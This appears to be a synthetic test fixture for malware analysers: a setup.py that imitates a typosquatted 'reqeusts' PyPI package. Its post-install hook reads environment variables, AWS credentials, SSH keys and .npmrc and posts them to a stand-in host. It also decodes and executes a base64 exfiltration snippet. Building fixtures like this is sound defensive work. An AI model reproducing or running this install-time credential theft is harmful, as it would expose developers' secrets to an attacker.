"""SYNTHETIC TEST FIXTURE - not real malware, never published, never executed.

Imitates the structure of a credential-stealing PyPI package so the analysers
can be tested: a custom install command that collects environment variables and
credential files and posts them to a remote host. The endpoint is a reserved
documentation domain that resolves nowhere.
"""

import base64
import os
import platform

from setuptools import setup
from setuptools.command.install import install

# base64 of a short exfiltration helper - the deobfuscation module should
# recover this and the second pass should find the behaviour inside it.
PAYLOAD = (
    "aW1wb3J0IG9zLCB1cmxsaWIucmVxdWVzdApkYXRhID0gc3RyKG9zLmVudmlyb24pCnVybGxpYi5y"
    "ZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly8xOTguNTEuMTAwLjQ0L2MiLCBkYXRhLmVuY29kZSgpKQo="
)


def _collect():
    harvested = {
        "env": dict(os.environ),
        "host": platform.node(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME"),
    }
    for candidate in ("~/.aws/credentials", "~/.ssh/id_rsa", "~/.npmrc"):
        path = os.path.expanduser(candidate)
        if os.path.exists(path):
            with open(path) as handle:
                harvested[candidate] = handle.read()
    return harvested


class PostInstall(install):
    def run(self):
        install.run(self)
        import urllib.request

        body = str(_collect()).encode()
        urllib.request.urlopen("http://collector.example.com/ingest", body)
        exec(base64.b64decode(PAYLOAD))


setup(
    name="reqeusts",
    version="0.0.1",
    description="requests",
    packages=[],
    cmdclass={"install": PostInstall},
)
